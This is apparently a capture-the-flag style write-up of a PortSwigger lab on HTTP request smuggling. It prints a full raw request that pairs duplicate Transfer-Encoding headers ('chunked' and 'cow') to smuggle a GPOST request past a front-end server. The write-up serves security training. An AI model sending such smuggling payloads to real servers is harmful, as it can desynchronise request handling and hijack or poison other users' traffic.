#  HTTP - request smuggling, obfuscating the TE header

## 📌 Lab Details
- **Title**: HTTP request smuggling, obfuscating the TE header
- **Difficulty**: Practitioner
- **Category**: HTTP Request Smuggling
- **Lab URL**: https://portswigger.net/academy/labs/launch/417947bec9fe621dfdc11f4d622cef72b0021a6d872aa83cca70aaf532b4b592?referrer=%2fweb-security%2frequest-smuggling%2flab-obfuscating-te-header

## 🔍 Summary
In this lab, the front-end and back-end servers handle duplicate Transfer-Encoding headers differently, with the front-end using the last one (`cow`) and the back-end using the first (`chunked`).
This mismatch lets us smuggle a hidden `GPOST` request inside the body, which the back-end treats as the next request, causing it to return “Unrecognized method GPOST.”

## 🛠 Steps to Solve
1. Intercept the request and send it to **Burp Repeater**.
2. Now, issue the following request twice:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-length: 4
   Transfer-Encoding: chunked
   Transfer-encoding: cow

   5c
   GPOST / HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 15

   x=1
   0

   ```
3. The second response should say: `Unrecognized method GPOST`.

## 📖 Key Takeaways
- **Duplicate header handling differences** are a real-world source of request smuggling vulnerabilities.
- The **front-end** and **back-end** may choose **different duplicates** to honor — attacker can control which one gets used by each.
- Obfuscating the `Transfer-Encoding` header allows chunked parsing on one server but not the other.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/da1359d1-efa0-4187-95eb-9ff7e33ad4c2" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/1877d8cb-16fe-4cc0-bf13-13ffda1509d4" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/44865888-97bb-49ab-b308-a195b9cc7862" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/eaa32fbd-2695-4685-874d-0fb679e73bb8" />
